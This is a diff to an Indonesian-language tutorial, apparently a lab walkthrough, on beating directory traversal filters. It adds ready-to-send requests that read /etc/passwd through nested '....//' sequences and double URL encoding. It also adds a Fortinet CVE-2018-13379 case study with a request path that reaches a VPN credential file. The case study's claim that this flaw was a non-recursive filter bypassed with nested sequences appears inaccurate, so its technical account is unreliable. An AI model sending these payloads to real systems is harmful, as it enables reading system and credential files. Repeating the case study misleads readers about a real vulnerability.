@@ -1,5 +1,21 @@
 # Directory Traversal: Bypassing Filter Pertahanan (Nested, Encoding, & Prefix)
 
+> [!TIP]
+> ### ⚡ Cara Cepat / Quick Solution (Langsung Praktik)
+> 1. Tangkap request gambar di Burp Repeater: `GET /image?filename=...`
+> 2. Terapkan teknik bypass filter berikut:
+>    - **Nested Traversal Sequence (Non-Recursive Strip):**
+>      ```http
+>      GET /image?filename=....//....//....//etc/passwd HTTP/1.1
+>      ```
+>    - **Double URL Encoding:**
+>      ```http
+>      GET /image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd HTTP/1.1
+>      ```
+> 3. Klik **Send** $\rightarrow$ filter blacklist terlewati dan berkas `/etc/passwd` terbaca.
+
+---
+
 Ketika pengembang menyadari bahaya celah _Directory Traversal_, reaksi pertama yang paling sering dilakukan adalah **membuat filter pembersihan (_sanitization/blacklist filter_)** untuk menghapus atau memblokir string berbahaya seperti `../`.
 
 Namun, jika filter tersebut dibuat secara naif (misalnya hanya menghapus string sekali jalan tanpa rekursif, tidak menangani _multi-layer URL decoding_, atau hanya memeriksa awalan folder), penyerang tetap dapat mengelabui filter dan membaca berkas rahasia sistem operasi.
@@ -174,6 +190,18 @@ Berikut panduan pengujian saat menghadapi filter Directory Traversal di **Burp S
 3. Berkas `/etc/passwd` berhasil diekstrak dan lab selesai (*Solved*)! 🎉
 
 ---
+
+## 🌍 Studi Kasus Nyata di Industri (Real-World Case Study)
+
+### Fortinet FortiOS SSL-VPN Nested Path Traversal (CVE-2018-13379)
+Salah satu celah path traversal paling berdampak buruk yang dieksploitasi sindikat ransomware internasional:
+* **Filter Rapuh Fortinet:** Perangkat VPN enterprise Fortinet FortiOS memfilter parameter bahasa portal VPN dengan menghapus sekuens `../` secara non-rekursif.
+* **Bypass via Nested Sequences:** Penyerang menggunakan sekuens bersarang `....//` pada request URL:
+  ```text
+  GET /remote/fgt_lang?lang=....//....//....//....//....//....//....//dev/cmdb/sslvpn_websession HTTP/1.1
+  ```
+  Ketika filter menghapus `../`, karakter yang tersisa bergabung kembali membentuk `../` yang sah dan tembus ke file sistem Linux FortiOS.
+* **Dampak Skala Dunia:** File `sslvpn_websession` menyimpan username dan password koneksi VPN dalam bentuk teks biasa. Kelompok ransomware ternama (seperti REvil dan Conti) memanfaatkan celah ini untuk mencuri kredensial ribuan perusahaan multinasional dan instansi pemerintahan dunia.
 
 ## 5. Bedah Kode Backend: Rentan vs Aman
 
